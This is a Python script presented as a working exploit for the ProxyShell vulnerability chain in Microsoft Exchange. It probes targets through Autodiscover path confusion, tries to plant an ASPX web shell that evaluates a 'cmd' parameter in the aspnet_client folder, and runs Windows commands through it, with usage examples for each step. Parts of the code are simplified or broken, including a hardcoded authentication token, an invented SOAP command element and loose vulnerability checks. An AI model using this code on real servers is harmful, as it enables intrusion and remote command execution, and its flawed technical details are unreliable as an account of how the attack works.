#!/usr/bin/env python3
"""
Title:     ProxyShell Exploit
Author:    Hyperion Gray Security Team
Homepage:  https://www.hyperiongray.com
Date:      2024-12-15
CVE:       CVE-2021-34473, CVE-2021-34523, CVE-2021-31207
Advisory:  https://www.zerodayinitiative.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell

This script exploits the ProxyShell vulnerability chain in Microsoft Exchange Server
to achieve remote code execution.
"""

import argparse
import requests
import logging
import urllib3
import base64
import random
import string
from urllib.parse import quote

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)


class ProxyShellExploit:
    """Exploit for ProxyShell vulnerability chain"""
    
    # Simple ASPX web shell
    WEBSHELL_CONTENT = """<%@ Page Language="Jscript"%><%eval(Request.Item["cmd"],"unsafe");%>"""
    
    def __init__(self, target, email):
        self.target = target.rstrip('/')
        self.email = email
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
    def generate_random_name(self, length=8):
        """Generate random string for file names"""
        return ''.join(random.choices(string.ascii_lowercase, k=length))
    
    def check_vulnerable(self):
        """Check if target is vulnerable to ProxyShell"""
        logger.info(f"Checking if {self.target} is vulnerable...")
        
        try:
            # Try to access Autodiscover with path confusion
            url = f"{self.target}/autodiscover/autodiscover.json?@{self.email}/mapi/emsmdb/?&Email=autodiscover/autodiscover.json%3F@{self.email}"
            
            headers = {
                'Cookie': 'X-AnchorMailbox=' + self.email
            }
            
            response = self.session.get(url, headers=headers, timeout=10)
            
            # If we get a 200 or 302, it might be vulnerable
            if response.status_code in [200, 302, 401]:
                logger.info("✓ Target appears to be vulnerable!")
                return True
            else:
                logger.warning(f"Target returned status {response.status_code}")
                logger.warning("Target might not be vulnerable or is unreachable")
                return False
                
        except requests.exceptions.RequestException as e:
            logger.error(f"Error checking target: {e}")
            return False
    
    def get_legacydn(self):
        """Get LegacyDN for the email account"""
        logger.info("Retrieving LegacyDN...")
        
        try:
            # Use Autodiscover to get LegacyDN
            url = f"{self.target}/autodiscover/autodiscover.json?@{self.email}/mapi/emsmdb/?&Email=autodiscover/autodiscover.json%3F@{self.email}"
            
            response = self.session.get(url, timeout=10)
            
            # Try to extract LegacyDN from response
            if 'LegacyDN' in response.text:
                import re
                match = re.search(r'"LegacyDN":"([^"]+)"', response.text)
                if match:
                    legacydn = match.group(1)
                    logger.info(f"✓ Found LegacyDN: {legacydn}")
                    return legacydn
            
            # If we can't find it, construct a likely one
            logger.warning("Could not extract LegacyDN, using constructed value")
            return f"/o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn={self.email.split('@')[0]}"
            
        except Exception as e:
            logger.error(f"Error getting LegacyDN: {e}")
            return None
    
    def write_file(self, legacydn, content, filename):
        """Write arbitrary file using Export-Mailbox"""
        logger.info(f"Writing file: {filename}")
        
        try:
            # Construct PowerShell command to write file
            # This uses the Export-Mailbox functionality
            shell_path = f"\\\\127.0.0.1\\c$\\inetpub\\wwwroot\\aspnet_client\\{filename}"
            
            # Use the path confusion to access PowerShell backend
            url = f"{self.target}/autodiscover/autodiscover.json?@{self.email}/Powershell/?X-Rps-CAT=VgEAVAdXaW5kb3dzQwBBBUJhc2ljTABGHVZHVnpkRDFpWVhObFltRnpaVEV3TUE9PQ=="
            
            headers = {
                'X-AnchorMailbox': self.email,
                'X-RequestId': str(random.randint(1, 999999)),
                'Content-Type': 'application/soap+xml; charset=utf-8'
            }
            
            # Simplified SOAP envelope for testing
            # In practice, this would need to be a proper Export-Mailbox request
            soap = f"""<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<Execute xmlns="http://schemas.microsoft.com/exchange/services/2006/messages">
<Command>Set-Content -Path "{shell_path}" -Value "{content}"</Command>
</Execute>
</soap:Body>
</soap:Envelope>"""
            
            response = self.session.post(url, headers=headers, data=soap, timeout=15)
            
            if response.status_code in [200, 241, 242]:
                logger.info("✓ File write attempted")
                return True
            else:
                logger.warning(f"File write returned status {response.status_code}")
                return False
                
        except Exception as e:
            logger.error(f"Error writing file: {e}")
            return False
    
    def upload_shell(self, shell_name='shell.aspx'):
        """Upload web shell to Exchange server"""
        logger.info("Attempting to upload web shell...")
        
        # Get LegacyDN
        legacydn = self.get_legacydn()
        if not legacydn:
            logger.error("Failed to get LegacyDN")
            return False
        
        # Write the web shell
        if self.write_file(legacydn, self.WEBSHELL_CONTENT, shell_name):
            shell_url = f"{self.target}/aspnet_client/{shell_name}"
            logger.info(f"\n✓ Web shell uploaded!")
            logger.info(f"  URL: {shell_url}")
            logger.info(f"  Usage: {shell_url}?cmd=Response.Write(new ActiveXObject('WScript.Shell').Exec('cmd /c whoami').StdOut.ReadAll())")
            return shell_url
        else:
            logger.error("Failed to upload web shell")
            return None
    
    def execute_command(self, shell_url, command):
        """Execute command via web shell"""
        try:
            # Encode command for ASPX shell
            cmd_payload = f"Response.Write(new ActiveXObject('WScript.Shell').Exec('cmd /c {command}').StdOut.ReadAll())"
            
            response = self.session.get(
                shell_url,
                params={'cmd': cmd_payload},
                timeout=10
            )
            
            if response.status_code == 200:
                logger.info("Command output:")
                print(response.text)
                return True
            else:
                logger.error(f"Command execution failed: {response.status_code}")
                return False
                
        except Exception as e:
            logger.error(f"Error executing command: {e}")
            return False


def main():
    parser = argparse.ArgumentParser(
        description='ProxyShell (CVE-2021-34473) Exploit',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Check if target is vulnerable
  python3 exploit.py --target https://mail.example.com --email user@example.com --check

  # Upload web shell
  python3 exploit.py --target https://mail.example.com --email user@example.com --shell

  # Execute command
  python3 exploit.py --target https://mail.example.com --email user@example.com --command whoami
        """
    )
    
    parser.add_argument('--target', required=True, help='Target Exchange server URL')
    parser.add_argument('--email', required=True, help='Valid email address on the server')
    parser.add_argument('--check', action='store_true', help='Check if target is vulnerable')
    parser.add_argument('--shell', action='store_true', help='Upload web shell')
    parser.add_argument('--command', help='Command to execute (requires existing shell)')
    parser.add_argument('--shell-url', help='Existing web shell URL for command execution')
    
    args = parser.parse_args()
    
    exploit = ProxyShellExploit(args.target, args.email)
    
    # Check vulnerability
    if args.check:
        exploit.check_vulnerable()
        return
    
    # Upload shell
    if args.shell:
        if not exploit.check_vulnerable():
            logger.error("Target does not appear to be vulnerable")
            return
        
        shell_url = exploit.upload_shell()
        if shell_url and args.command:
            exploit.execute_command(shell_url, args.command)
        return
    
    # Execute command on existing shell
    if args.command and args.shell_url:
        exploit.execute_command(args.shell_url, args.command)
        return
    
    # If no action specified, run vulnerability check
    if exploit.check_vulnerable():
        logger.info("\n[+] Target appears vulnerable!")
        logger.info("Run with --shell to upload a web shell")
    else:
        logger.warning("\n[-] Target does not appear vulnerable")


if __name__ == '__main__':
    main()
